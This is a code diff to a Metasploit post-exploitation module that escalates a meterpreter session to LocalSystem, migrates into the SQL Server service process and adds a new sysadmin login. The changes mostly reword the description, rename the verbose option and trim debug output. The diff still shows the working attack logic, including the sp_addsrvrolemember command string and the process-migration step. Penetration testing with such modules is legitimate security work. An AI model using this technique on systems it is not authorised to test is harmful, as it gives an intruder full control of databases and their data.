@@ -11,17 +11,19 @@ class Metasploit3 < Msf::Post
 		super( update_info( info,
 				'Name'          => 'SQL Server - Local Authorization Bypass',
 				'Description'   => %q{ When this module is executed via an existing 
-				meterpreter session it can be used to gain unauthorized access to local 
-				SQL Server instances.  It first obtains LocalSystem privileges 
-				using the "getsystem" escalation methods. Next, it migrate to the
-				SQL Server service process associated with the target instance.  Finally, 
-				it adds a sysadmin login to the local SQL Server using native SQL 
-				clients and stored procedures.  If no intance is specified the default 
-				will be used.  
+				meterpreter session it can be used to add a sysadmin to local 
+				SQL Server instances.  It first attempts to gain LocalSystem privileges 
+				using the "getsystem" escalation methods. If those privileges are not
+				sufficient to add a sysadmin, then it will migrate to the SQL Server 
+				service process associated with the target instance.  The sysadmin 
+				login is added to the local SQL Server using native SQL clients and 
+				stored procedures.  If no intance is specified then the first identified 
+				instance will be used.  
 				
-				This is possible because SQL Server service process always has 
-				syadmin privileges in SQL Server.  This has been tested
-				in SQL Server 2000. 2005, 2008, and 2012.},
+				How is this possible? By default in SQL Server 2k-2k8, LocalSystem  
+				is assigned syadmin privileges.  Microsoft changed the default in 
+				SQL Server 2012 so that LocalSystem no longer has sysadmin privileges.
+				However, this can be overcome by migrating to the SQL Server process.},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Scott Sutherland <scott.sutherland@netspi.com>'],
 				'Platform'      => [ 'Windows' ],
@@ -34,14 +36,12 @@ class Metasploit3 < Msf::Post
 				OptString.new('DB_PASSWORD',  [true, 'Password for new sysadmin login', '']),
 				OptString.new('INSTANCE',  [false, 'Name of target SQL Server instance', '']),
 				OptBool.new('REMOVE_LOGIN',  [false, 'Remove DB_USERNAME login from database', 'false']),
-				OptBool.new('_VERBOSE',  [false, 'Set how verbose the output should be', 'false']),
+				OptBool.new('VERBOSE',  [false, 'Set how verbose the output should be', 'false']),
 			], self.class)
 	end
 	
 	# TODO
-	# - fix - migrate wont rev2self...need to return back to system 
-	#   privs, session dies after execution due to lack of privs - i think..	
-	# - fix - when not using incognito set token = false	
+	# - test incognito token stuff
 	# - update verbose stuff	
 	# - test all fucntions on all version
 	# - run through ruby module validation process
@@ -50,7 +50,7 @@ class Metasploit3 < Msf::Post
 	def run
 				
 		# Set verbosity level
-		verbose = datastore['_verbose'].to_s.downcase 
+		verbose = datastore['verbose'].to_s.downcase 
 		
 		# Set instance name (if specified)
 		instance = datastore['instance'].to_s.upcase
@@ -234,13 +234,7 @@ class Metasploit3 < Msf::Post
 		end
 
 		# Display debugging information
-		print_status("Settings:") if verbose == "true" 
-		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
-		print_status(" o Service instance: #{service_instance}") if verbose == "true" 
-		print_status(" o User defined instance: #{instance}") if verbose == "true" 
-		print_status(" o User: #{dbuser}") if verbose == "true" 
-		print_status(" o Password:  #{dbpass}") if verbose == "true"  		
-		print_status("Command:") if verbose == "true" 
+		print_status("Running command:") if verbose == "true" 
 		print_status("#{sqlcommand}") if verbose == "true" 
 		
 		# Get Data
@@ -289,14 +283,8 @@ class Metasploit3 < Msf::Post
 			sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{instance} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""	
 		end
 	
-		# Display debugging information
-		print_status("Settings:") if verbose == "true" 
-		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
-		print_status(" o Service instance: #{service_instance}") if verbose == "true" 
-		print_status(" o User defined instance: #{instance}") if verbose == "true" 
-		print_status(" o User: #{dbuser}") if verbose == "true" 
-		print_status(" o Password:  #{dbpass}") if verbose == "true"  		
-		print_status("Command:") if verbose == "true" 
+		# Display debugging information		
+		print_status("Running command:") if verbose == "true" 
 		print_status("#{sqlcommand}") if verbose == "true" 
 		
 		# Get Data
@@ -438,9 +426,9 @@ class Metasploit3 < Msf::Post
 			end
 		end
 	
-		# Attempt to migrate to target sqlservr.exe  process
+		# Attempt to migrate to target sqlservr.exe process
 		if targetuser == "" then
-			print_error("Unabled to find sqlservr.exe process not running as SYSTEM")
+			print_error("Unable to find sqlservr.exe process not running as SYSTEM")
 			return 0
 		else 			
 			begin
